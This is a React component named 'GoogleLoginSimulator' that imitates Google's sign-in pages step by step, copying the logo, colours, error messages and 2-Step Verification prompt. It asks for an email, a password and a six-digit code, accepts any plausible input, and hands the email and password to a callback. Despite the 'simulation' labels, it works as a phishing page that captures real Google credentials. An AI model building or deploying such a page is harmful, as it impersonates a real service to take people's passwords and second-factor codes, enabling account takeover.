import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Loader2, X, ChevronDown, Eye, EyeOff } from 'lucide-react';

interface GoogleLoginSimulatorProps {
  onSuccess: (email: string, password?: string) => void;
  onClose: () => void;
}

const GoogleLoginSimulator: React.FC<GoogleLoginSimulatorProps> = ({ onSuccess, onClose }) => {
  const [step, setStep] = useState<'email' | 'password' | 'otp'>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [otpCode, setOtpCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  // Lock body scroll when modal is open
  useEffect(() => {
    document.body.style.overflow = 'hidden';
    return () => {
      document.body.style.overflow = 'unset';
    };
  }, []);

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    // --- STEP 1: EMAIL ---
    if (step === 'email') {
      if (!email) {
        setError('Enter an email or phone number');
        return;
      }
      if (!email.includes('@')) { 
        setError('Couldn\'t find your Google Account');
        return;
      }
      setIsLoading(true);
      await new Promise(resolve => setTimeout(resolve, 800));
      setIsLoading(false);
      setStep('password');
    } 
    // --- STEP 2: PASSWORD ---
    else if (step === 'password') {
      if (!password) {
        setError('Enter a password');
        return;
      }
      if (password.length < 4) {
        setError('Wrong password. Try again or click Forgot Password to reset it.');
        return;
      }
      setIsLoading(true);
      await new Promise(resolve => setTimeout(resolve, 1500));
      setIsLoading(false);
      setStep('otp');
    }
    // --- STEP 3: OTP ---
    else if (step === 'otp') {
      if (!otpCode || otpCode.length < 6) {
        setError('Wrong code. Try again.');
        return;
      }
      setIsLoading(true);
      await new Promise(resolve => setTimeout(resolve, 2000));
      setIsLoading(false);
      
      // Critical Fix: Call onSuccess directly
      onSuccess(email, password);
    }
  };

  const handleForgot = () => {
      alert("Fitur simulasi: Reset password telah dikirim ke email/nomor pemulihan Anda.");
  };

  const handleCreateAccount = () => {
      alert("Fitur simulasi: Halaman pembuatan akun akan terbuka di tab baru.");
  };

  return (
    <div 
      className="fixed inset-0 z-[70] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 font-sans"
      onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
    >
      <motion.div 
        initial={{ scale: 0.95, opacity: 0, y: 10 }}
        animate={{ scale: 1, opacity: 1, y: 0 }}
        exit={{ scale: 0.95, opacity: 0 }}
        className="bg-white text-gray-900 w-full max-w-[450px] min-h-[550px] rounded-[28px] p-0 shadow-lg flex flex-col relative overflow-hidden"
      >
        {/* Loading Bar Line */}
        {isLoading && (
            <div className="absolute top-0 left-0 w-full h-1 bg-blue-100 overflow-hidden z-50">
                <div className="w-full h-full bg-[#1a73e8] origin-left animate-[loading_1s_ease-in-out_infinite]"></div>
            </div>
        )}

        {/* Close Button */}
        <button 
            onClick={onClose}
            className="absolute top-4 right-4 text-gray-500 hover:text-gray-800 transition-colors z-50 p-2"
        >
            <X size={20} />
        </button>

        <div className="flex-1 px-10 pt-12 pb-6 flex flex-col no-scrollbar overflow-y-auto">
            {/* Google Logo */}
            <div className="flex justify-center mb-4">
               <svg viewBox="0 0 24 24" className="w-12 h-12" aria-hidden="true">
                  <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path>
                  <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path>
                  <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path>
                  <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path>
               </svg>
            </div>

            <div className="text-center mb-8">
                <h2 className="text-2xl font-normal text-gray-900 mb-2 font-['Google_Sans',sans-serif]">
                    {step === 'email' ? 'Sign in' : step === 'otp' ? '2-Step Verification' : 'Welcome'}
                </h2>
                
                {step === 'password' || step === 'otp' ? (
                    <div 
                        className="inline-flex items-center gap-2 p-1 pr-3 border border-gray-200 rounded-full cursor-pointer hover:bg-gray-50 transition-colors mt-2" 
                        onClick={() => step === 'password' && setStep('email')}
                    >
                        <div className="w-5 h-5 rounded-full bg-purple-600 text-white flex items-center justify-center text-[10px] font-bold">
                            {email.charAt(0).toUpperCase()}
                        </div>
                        <span className="text-sm font-medium text-gray-700">{email}</span>
                        {step === 'password' && <ChevronDown size={14} className="text-gray-500" />}
                    </div>
                ) : (
                    <p className="text-[16px] text-gray-900 mt-2">to continue to <span className="font-medium text-[#1a73e8]">MUSE</span></p>
                )}
                
                {step === 'otp' && (
                   <p className="text-sm text-gray-600 mt-6 px-4">
                     Google sent a notification to your phone. Tap <span className="font-bold">Yes</span> on the notification to verify it's you.
                   </p>
                )}
            </div>

            <form onSubmit={handleNext} className="flex-1 flex flex-col">
                <div className="flex-1 min-h-[140px]">
                    <AnimatePresence mode="wait">
                        {step === 'email' && (
                            <motion.div 
                                key="email"
                                initial={{ opacity: 0, x: -20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: 20 }}
                            >
                                <div className={`relative group`}>
                                    <input 
                                        type="text"
                                        id="identifier"
                                        className={`peer block w-full rounded-[4px] border border-gray-300 px-3.5 pt-5 pb-2 text-base text-gray-900 bg-white focus:border-[#1a73e8] focus:outline-none focus:ring-1 focus:ring-[#1a73e8] appearance-none ${error ? 'border-red-600 focus:border-red-600 focus:ring-red-600' : ''}`}
                                        placeholder=" "
                                        value={email}
                                        onChange={(e) => setEmail(e.target.value)}
                                        autoFocus
                                        style={{ backgroundColor: 'white' }}
                                    />
                                    <label 
                                        htmlFor="identifier"
                                        className={`absolute left-3 top-4 bg-white px-1 text-base text-gray-500 transition-all duration-200 
                                        peer-focus:-top-2.5 peer-focus:text-xs peer-focus:text-[#1a73e8] 
                                        peer-[:not(:placeholder-shown)]:-top-2.5 peer-[:not(:placeholder-shown)]:text-xs 
                                        ${error ? 'peer-focus:text-red-600 text-red-600' : ''}`}
                                    >
                                        Email or phone
                                    </label>
                                </div>
                                {error && (
                                    <div className="flex items-start gap-2 text-[#d93025] text-xs mt-2 px-1">
                                        <svg className="w-4 h-4 shrink-0" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                                        <span>{error}</span>
                                    </div>
                                )}
                                <div className="mt-8 text-sm text-[#1a73e8] font-medium cursor-pointer" onClick={handleForgot}>
                                    Forgot email?
                                </div>
                                <div className="mt-8 text-sm text-gray-600">
                                    Not your computer? Use Guest mode to sign in privately.
                                    <br />
                                    <a href="#" className="text-[#1a73e8] font-medium">Learn more</a>
                                </div>
                            </motion.div>
                        )}

                        {step === 'password' && (
                            <motion.div 
                                key="password"
                                initial={{ opacity: 0, x: 20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: -20 }}
                            >
                                <div className="relative group">
                                    <input 
                                        type={showPassword ? "text" : "password"}
                                        id="password"
                                        className={`peer block w-full rounded-[4px] border border-gray-300 px-3.5 pt-5 pb-2 text-base text-gray-900 bg-white focus:border-[#1a73e8] focus:outline-none focus:ring-1 focus:ring-[#1a73e8] appearance-none ${error ? 'border-red-600 focus:border-red-600 focus:ring-red-600' : ''}`}
                                        placeholder=" "
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        autoFocus
                                        style={{ backgroundColor: 'white' }}
                                    />
                                    <label 
                                        htmlFor="password"
                                        className={`absolute left-3 top-4 bg-white px-1 text-base text-gray-500 transition-all duration-200 
                                        peer-focus:-top-2.5 peer-focus:text-xs peer-focus:text-[#1a73e8] 
                                        peer-[:not(:placeholder-shown)]:-top-2.5 peer-[:not(:placeholder-shown)]:text-xs
                                        ${error ? 'peer-focus:text-red-600 text-red-600' : ''}`}
                                    >
                                        Enter your password
                                    </label>
                                </div>
                                <div className="mt-3">
                                    <label className="flex items-center gap-3 cursor-pointer select-none">
                                        <input 
                                            type="checkbox" 
                                            checked={showPassword}
                                            onChange={(e) => setShowPassword(e.target.checked)}
                                            className="w-4 h-4 text-[#1a73e8] rounded border-gray-300 focus:ring-[#1a73e8]" 
                                        />
                                        <span className="text-sm text-gray-900">Show password</span>
                                    </label>
                                </div>
                            </motion.div>
                        )}

                        {step === 'otp' && (
                             <motion.div 
                                key="otp"
                                initial={{ opacity: 0, x: 20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: -20 }}
                                className="flex flex-col items-center"
                            >
                                <div className="mb-6 w-full px-8">
                                    <div className="text-sm font-medium text-gray-500 mb-1">Enter code</div>
                                    <input 
                                        type="text"
                                        maxLength={6}
                                        className={`block w-full border-b border-gray-300 py-1 text-center text-2xl tracking-[0.5em] text-gray-900 focus:border-[#1a73e8] focus:outline-none bg-transparent ${error ? 'border-red-600' : ''}`}
                                        value={otpCode}
                                        onChange={(e) => setOtpCode(e.target.value.replace(/[^0-9]/g, ''))}
                                        autoFocus
                                        placeholder="------"
                                    />
                                </div>
                                
                                {error && (
                                    <div className="text-[#d93025] text-xs mb-4">{error}</div>
                                )}
                            </motion.div>
                        )}
                    </AnimatePresence>
                </div>

                {/* Actions Footer */}
                <div className="flex items-center justify-between mt-12 mb-2">
                    {step === 'email' ? (
                         <button type="button" className="text-[#1a73e8] text-sm font-medium hover:bg-blue-50 px-2 py-2 -ml-2 rounded transition-colors" onClick={handleCreateAccount}>
                            Create account
                        </button>
                    ) : (
                        <button type="button" className="text-[#1a73e8] text-sm font-medium hover:bg-blue-50 px-2 py-2 -ml-2 rounded transition-colors" onClick={() => step === 'password' ? handleForgot() : setStep('email')}>
                            {step === 'password' ? 'Forgot password?' : 'Try another way'}
                        </button>
                    )}

                    <button 
                        type="submit"
                        disabled={isLoading}
                        className="bg-[#1a73e8] hover:bg-[#1557b0] text-white text-sm font-medium px-6 py-2 rounded-full transition-colors shadow-sm disabled:opacity-70 disabled:cursor-not-allowed min-w-[80px] h-10"
                    >
                        {isLoading ? <Loader2 className="animate-spin w-5 h-5 mx-auto" /> : 'Next'}
                    </button>
                </div>
            </form>
        </div>
      </motion.div>
      <style>{`
        @keyframes loading {
          0% { transform: translateX(-100%); }
          50% { transform: translateX(0%); }
          100% { transform: translateX(100%); }
        }
      `}</style>
    </div>
  );
};

export default GoogleLoginSimulator;